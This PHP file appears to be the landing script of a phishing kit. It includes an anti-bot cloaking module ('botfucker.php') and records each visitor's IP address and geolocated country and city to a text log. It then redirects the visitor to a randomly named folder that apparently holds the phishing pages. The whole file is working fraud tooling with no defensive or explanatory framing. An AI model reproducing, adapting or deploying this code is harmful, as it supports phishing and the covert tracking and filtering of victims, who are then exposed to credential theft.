<?php
  include "./ZA245278896A/files/php/911/botfucker.php";
  include "./ZA245278896A/files/php/sys.php";
	$ip = getenv("REMOTE_ADDR");
	$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
    $country = $J7->geoplugin_countryName ; 
    $city = $J7->geoplugin_city ; 
    $file = fopen("SADDEM.txt","a");
    fwrite($file,"[+]".$ip."*|*".$country."*|*".$city."*|*".gmdate ("Y-n-d")." ".gmdate ("H:i:s")."\n");
    header("Location: ./ZA245278896A/");
?>